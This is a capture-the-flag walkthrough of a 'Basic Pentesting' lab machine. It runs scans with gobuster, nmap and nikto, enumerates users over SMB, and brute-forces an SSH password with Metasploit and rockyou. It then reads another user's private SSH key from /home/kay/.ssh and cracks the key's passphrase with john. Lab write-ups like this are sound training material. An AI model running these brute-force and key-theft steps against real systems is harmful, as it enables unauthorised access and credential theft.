# Basic Pentesting
---
## Enumeration

- **IP Address:** 10.10.73.11

### gobuster
`gobuster dir -u 10.10.73.11 -x .php,.xml,.html -w /usr/share/wordlists/dirb/common.txt`
<pre>
.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.xml (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.xml (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.xml (Status: 403)
/.htpasswd.html (Status: 403)
[/development (Status: 301)](###10.10.73.11/development/)
/index.html (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
</pre>

### nmap
`nmap -A -T5 -p- 10.10.73.11`
<pre>
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown\>
(unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-05-18T12:25:16-04:00                                                                                                                                                                                                 
| smb-security-mode:                                                                                                                                                                                                                       
|   account_used: guest                                                                                                                                                                                                                    
|   authentication_level: user                                                                                                                                                                                                             
|   challenge_response: supported                                                                                                                                                                                                          
|_  message_signing: disabled (dangerous, but default)                                                                                                                                                                                     
| smb2-security-mode:                                                                                                                                                                                                                      
|   2.02:                                                                                                                                                                                                                                  
|_    Message signing enabled but not required                                                                                                                                                                                             
| smb2-time:                                                                                                                                                                                                                               
|   date: 2021-05-18T16:25:16                                                                                                                                                                                                              
|_  start_date: N/A
</pre>



### nikto
`nikto -h 10.10.73.11`
<pre>
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 9e, size: 56a870fbc8f28, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3268: /development/: Directory indexing found.
+ OSVDB-3092: /development/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.

</pre>
### Wappalyzer
- **Webserver:** Apache 2.4.18
- **OS:** Ubuntu
---
## Investigation

### /index.html
- Just shows undergoing maintenance

### /development/

Contains: 
1. j.txt
- Reveals that they are using vers 2.5.12, using "struts"
-- [Exploitdb shows vers 2.5.12 of vulnerable to RCE](https://www.exploit-db.com/exploits/42627)
- Shows SMB configured, nmap shows it as 2.02
2. dev.txt 
- Reveals that user "j" has a weak password hash


## Intrusion

1. ~~port 8009 allows POST, maybe inject the vuln found on exploitDB above?~~
2. SMB port 445 is open for enum4linux 
`enum4linux -a 10.10.73.11`
- gives us "jan" and "kay"
3. brute force using ssh with metasploit
- open metasploit
- set options 
```  
search ssh
use 18
set USERNAME jan
set RHOSTS 10.10.73.11
set RPORT 22
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
exploit
```
- **password:** armando

## post-intrusion

`cd /tmp`
- `nano linenum.sh` and copy paste [enumeration script](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- ~~check for GTFO bins~~
- ~~check for relaxed permissions~~
- go looking in /home/kay for some information
` cat /home/kay/.ssh/id_rsa`

on local machine:
`ssh -i kaykey kay@10.10.73.11`
- connection asks for passphrase?

```
ssh2john.py kaykey > johnkey
john -wordlist=/usr/share/wordlists/rockyou.txt johnkey
```
passphrase= "beeswax"

`ssh -i kaykey kay@10.10.73.11`
**passphrase:** beeswax
`cat pass.bak`
>heresareallystrongpasswordthatfollowsthepasswordpolicy$$